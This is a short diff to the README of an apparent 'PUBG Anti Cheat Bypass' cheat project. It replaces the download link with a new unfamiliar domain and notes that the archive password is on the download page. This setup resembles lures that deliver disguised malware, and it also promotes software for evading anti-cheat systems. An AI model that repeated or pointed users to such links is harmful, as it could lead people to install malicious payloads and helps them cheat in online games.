@@ -18,7 +18,7 @@ PUBG Anti Cheat Bypass - undetected PUBG cheat. Bypasses anti-cheat system. Work
 
 ## Download
 
-[![Download v5.3.0](https://img.shields.io/badge/Download_v5.3.0-ec4899?style=for-the-badge&logoColor=white)](https://connectinstruction.com/pubgbypass2)
+[![Download v5.3.0](https://img.shields.io/badge/Download_v5.3.0-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/pubgbypass2)
 
 > The archive password is shown on the download page.
 
